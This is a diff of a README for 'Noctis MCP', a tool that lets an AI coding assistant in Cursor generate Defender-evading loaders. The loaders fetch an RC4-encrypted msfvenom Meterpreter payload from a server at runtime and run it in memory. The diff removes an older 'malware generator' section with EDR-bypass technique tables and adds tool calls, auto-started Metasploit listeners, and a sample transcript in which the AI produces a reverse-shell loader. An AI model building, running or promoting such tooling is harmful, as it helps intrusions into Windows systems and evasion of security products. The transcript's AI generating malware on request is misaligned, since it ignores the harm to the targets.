@@ -1,5 +1,5 @@
 # NOCTIS MCP v3.0
-## Fully Automated Malware Generator with RAG Intelligence
+## Automated Stageless Loader with MCP Integration
 
 **Status:** Production Ready | **Version:** 3.0.0
 
@@ -7,39 +7,45 @@
 
 ## 🎯 What It Does
 
-**You say:** "Build beacon for CrowdStrike at 10.0.0.5:443"
+**You say (in Cursor):** "Generate stageless loader for 192.168.1.56:4444"
 
-**System delivers:** Working .exe that connects to your C2
+**System delivers:**
+- ✅ Working stageless loader.exe (bypasses Defender)
+- ✅ RC4-encrypted MSFVenom payload
+- ✅ HTTP server ready to serve payload
+- ✅ Metasploit listener ready to catch shell
 
 ### Complete Automated Workflow:
 
 ```
-1. RAG Intelligence → Searches techniques/*.c for working code
-2. AI Writes Code → Combines techniques dynamically
-3. Beacon Generation → Sliver/msfvenom with YOUR IP
-4. Compilation → MinGW with auto-detected dependencies
-5. Testing → VirusTotal (prototypes only)
-6. Learning → Records what works against each EDR
+1. AI calls noctis_generate_stageless_loader(your_ip, port)
+2. System generates MSFVenom payload
+3. System encrypts with RC4 (polymorphic key)
+4. System compiles clean loader (NO MSFVenom inside!)
+5. System creates server/listener scripts
+6. User runs loader on Windows → Gets Meterpreter shell
 ```
 
 ---
 
-## 🎉 **NEW: Staged Payload Loader**
+## 🎉 **Stageless Loader - EDR Bypass**
 
-**Automated EDR-bypassing loader system** - See `staged-loader/` directory!
+**How it bypasses Defender:**
+- Loader binary contains **NO MSFVenom** (clean 17KB)
+- Downloads encrypted payload at runtime from your HTTP server
+- Decrypts in memory with RC4
+- Executes stageless Meterpreter
 
-```bash
-cd staged-loader/
-./setup.sh        # One command setup!
-```
+**Key:** Defender can't detect what isn't in the file yet!
 
 **Features:**
 - ✅ Bypasses Windows Defender
-- ✅ Staged download (no MSFVenom in binary)
-- ✅ RC4 encryption
-- ✅ Fully automated
+- ✅ Stageless download (no MSFVenom signatures)
+- ✅ RC4 encryption (new key per build)
+- ✅ Fully automated via MCP tools
+- ✅ Cursor AI integration
 
-**Docs:** [staged-loader/README.md](staged-loader/README.md) | [QUICKSTART](staged-loader/QUICKSTART.md)
+**Manual Setup:** [staged-loader/README.md](staged-loader/README.md) | [QUICKSTART](staged-loader/QUICKSTART.md)
 
 ---
 
@@ -49,30 +55,16 @@ cd staged-loader/
 
 ```bash
 # Install Python packages
-pip install -r requirements.txt
+pip install fastmcp flask requests
 
 # Install MinGW (for compilation)
 sudo apt install mingw-w64
 
-# Install Sliver (optional but recommended)
-curl https://sliver.sh/install | sudo bash
-
-# Or install Metasploit (for msfvenom)
+# Install Metasploit (for msfvenom)
 sudo apt install metasploit-framework
 ```
 
-### 2. Configure VirusTotal (Optional)
-
-```bash
-# Copy example env file
-cp .env.example .env
-
-# Edit .env and add your VT API key
-# Get free key at: https://www.virustotal.com/gui/my-apikey
-echo "VIRUSTOTAL_API_KEY=your_key_here" >> .env
-```
-
-### 3. Start Server
+### 2. Start Server
 
 ```bash
 ./start_server.sh
@@ -81,7 +73,9 @@ echo "VIRUSTOTAL_API_KEY=your_key_here" >> .env
 python3 server/noctis_server.py
 ```
 
-### 4. Configure MCP in Cursor
+Server starts on **http://localhost:8888**
+
+### 3. Configure MCP in Cursor
 
 Settings → Features → Model Context Protocol → Edit Config
 
@@ -94,74 +88,80 @@ Add this to your MCP config:
       "command": "python3",
       "args": ["-m", "noctis_mcp.noctis_tools"],
       "cwd": "/home/yenn/Documents/Noctis-AI/Noctis-MCP",
-      "description": "Noctis MCP v3.0"
+      "description": "Noctis Stageless Loader"
     }
   }
 }
 ```
 
+### 4. Use in Cursor
+
+Just ask:
+```
+"Generate stageless loader for 192.168.1.56:4444"
+```
+
+AI will:
+1. Call `noctis_generate_stageless_loader()`
+2. Generate everything automatically
+3. Give you instructions for server/listener
+4. You just run the loader on Windows!
+
 ---
 
-## 📋 MCP Tools (5 Essential)
+## 📋 MCP Tools (4 Available)
 
-### 1. `noctis_get_edr_bypasses(target_edr)`
-**Get bypass techniques for specific EDR**
+### 1. `noctis_generate_stageless_loader(lhost, lport, http_port, auto_start_servers=True)`
+**Main tool - FULLY AUTOMATED! Does everything for you!**
 
 ```python
-noctis_get_edr_bypasses("CrowdStrike")
+noctis_generate_stageless_loader("192.168.1.56", 4444, 8080)
+
+# Automatically does:
+# 1. Generates MSFVenom payload (stageless meterpreter)
+# 2. Encrypts with RC4 (polymorphic key per build)
+# 3. Compiles clean loader (NO MSFVenom!)
+# 4. Starts HTTP server in background
+# 5. Starts Metasploit listener in background
+#
+# You just:
+# - Copy loader.exe to Windows VM
+# - Run it
+# - Get Meterpreter shell!
+```
+
+### 2. `noctis_check_status()`
+**Check complete system status**
+
+```python
+noctis_check_status()
 
 # Returns:
-# - Recommended techniques (hwbp_syscalls, waiting_thread_hijacking, etw_bypass)
-# - Code snippets from RAG
-# - OPSEC guidance
+# - File status (which files exist, sizes)
+# - Running services (HTTP server, MSF listener PIDs)
+# - System readiness
 ```
 
-### 2. `noctis_generate_beacon(c2_type, listener_ip, listener_port, architecture)`
-**Generate C2 beacon with ANY IP**
+### 3. `noctis_start_servers(lhost, lport, http_port)`
+**Manually start HTTP server and MSF listener**
 
 ```python
-noctis_generate_beacon("sliver", "10.0.0.5", 443, "x64")
+noctis_start_servers("192.168.1.56", 4444, 8080)
 
-# Supports:
-# - c2_type: "sliver" or "msfvenom"
-# - listener_ip: ANY IP (10.x, 192.168.x, public IP)
-# - Returns: C array format shellcode ready to paste
+# Starts:
+# - HTTP server (serves payload.enc)
+# - Metasploit listener (catches shells)
 ```
 
-### 3. `noctis_compile(source_file, target_edr, architecture)`
-**Compile with auto-detected dependencies**
+### 4. `noctis_stop_servers()`
+**Stop all running servers**
 
 ```python
-noctis_compile("my_beacon.c", "CrowdStrike", "x64")
+noctis_stop_servers()
 
-# Auto-detects:
-# - Zilean, poolparty, syswhispers3, etc from #include
-# - Compiles with MinGW
-# - EDR-specific optimizations
-```
-
-### 4. `noctis_test_binary(binary_path, target_edr)`
-**Test on VirusTotal (prototypes only!)**
-
-```python
-noctis_test_binary("compiled/beacon.exe", "CrowdStrike")
-
-# Returns:
-# - Detection rate (e.g., 3/70)
-# - CrowdStrike specific result
-# - Top 5 detections
-```
-
-### 5. `noctis_record_result(target_edr, detected, techniques, notes)`
-**Record test results for learning**
-
-```python
-noctis_record_result("CrowdStrike", False, "hwbp_syscalls,waiting_thread_hijacking", "Bypassed successfully")
-
-# System learns:
-# - What works against each EDR
-# - Updates recommendations
-# - Improves future suggestions
+# Stops:
+# - HTTP server
+# - Metasploit listener
 ```
 
 ---
@@ -171,44 +171,70 @@ noctis_record_result("CrowdStrike", False, "hwbp_syscalls,waiting_thread_hijacki
 ### In Cursor with AI:
 
 ```
-YOU: Build a beacon to bypass CrowdStrike, connect to 10.0.0.5:443
+YOU: Generate stageless loader for 192.168.1.56:4444
 
-AI: Let me build that for you...
+AI: I'll generate and set up everything automatically...
 
-[AI calls: noctis_get_edr_bypasses("CrowdStrike")]
-Found techniques: hwbp_syscalls (88% success), waiting_thread_hijacking (90%), etw_bypass (85%)
+[AI calls: noctis_generate_stageless_loader("192.168.1.56", 4444, 8080)]
 
-[AI calls: noctis_generate_beacon("sliver", "10.0.0.5", 443)]
-Generated 4,832 bytes of shellcode
+✅ STAGELESS LOADER GENERATED!
 
-[AI writes: crowdstrike_beacon.c]
-... AI writes malware code combining techniques + shellcode ...
+LHOST: 192.168.1.56
+LPORT: 4444
+HTTP Port: 8080
 
-[AI calls: noctis_compile("crowdstrike_beacon.c", "CrowdStrike", "x64")]
-Compiled: beacon.exe (67 KB)
+Generated files:
+  ✓ staged_loader.exe (17,408 bytes) - CLEAN, NO MSFVenom!
+  ✓ payload.enc (203,264 bytes) - RC4 encrypted
+  ✓ start_server.sh - HTTP server script
+  ✓ start_listener.sh - Metasploit listener script
 
-[AI calls: noctis_test_binary("compiled/beacon.exe", "CrowdStrike")]
-Detection: 3/70 (CrowdStrike: CLEAN ✓)
+🚀 STARTING SERVERS AUTOMATICALLY...
 
-DONE! beacon.exe is ready at: compiled/beacon.exe
+✅ HTTP Server: RUNNING on port 8080
+   Serving: http://localhost:8080/payload.enc
+   PID: 12345
+
+✅ Metasploit Listener: RUNNING
+   Listening: 192.168.1.56:4444
+   Payload: windows/x64/meterpreter_reverse_tcp
+   PID: 12346
+
+🎯 READY TO TEST!
+
+Next steps:
+  1. Copy /path/to/staged_loader.exe to Windows VM
+  2. Run the loader on Windows
+  3. Watch Metasploit for incoming session!
+
+AI: Done! Everything is running. The servers are started in the background.
+Just copy the loader to your Windows VM and run it!
 ```
 
 ---
 
-## 🎯 Target EDRs (10 Supported)
+## 🎯 How It Works
 
-| EDR | Recommended Techniques | Success Rate |
-|-----|----------------------|--------------|
-| Microsoft Defender | indirect_syscalls, zilean_sleep, poolparty | 85% |
-| CrowdStrike Falcon | hwbp_syscalls, waiting_thread_hijacking, etw_bypass | 88% |
-| SentinelOne | module_stomping, memory_bouncing, hwbp_syscalls | 82% |
-| Sophos Intercept X | indirect_syscalls, zilean_sleep, poolparty | 85% |
-| Trend Micro Vision One | indirect_syscalls, poolparty, zilean_sleep | 82% |
-| Carbon Black | module_stomping, transacted_hollowing, hwbp_syscalls | 85% |
-| Palo Alto Cortex XDR | hwbp_syscalls, memory_bouncing, etw_bypass | 80% |
-| Trellix (McAfee) | indirect_syscalls, zilean_sleep, poolparty | 85% |
-| ESET PROTECT | indirect_syscalls, module_stomping, zilean_sleep | 82% |
-| Bitdefender GravityZone | hwbp_syscalls, transacted_hollowing, memory_bouncing | 85% |
+### Traditional Approach (Detected)
+```
+[Binary with embedded MSFVenom]
+    → Defender scans
+    → ❌ DETECTED (MSFVenom signatures)
+```
+
+### Stageless Loader (Bypasses Defender)
+```
+[Clean loader.exe (17KB, NO MSFVenom)]
+    → Defender scans
+    → ✅ CLEAN (no suspicious code)
+    → Runs on Windows
+    → Downloads payload.enc from your server
+    → Decrypts with RC4 in memory
+    → Executes stageless Meterpreter
+    → ✅ Shell established!
+```
+
+**Key:** Defender can't detect what isn't in the file yet!
 
 ---
 
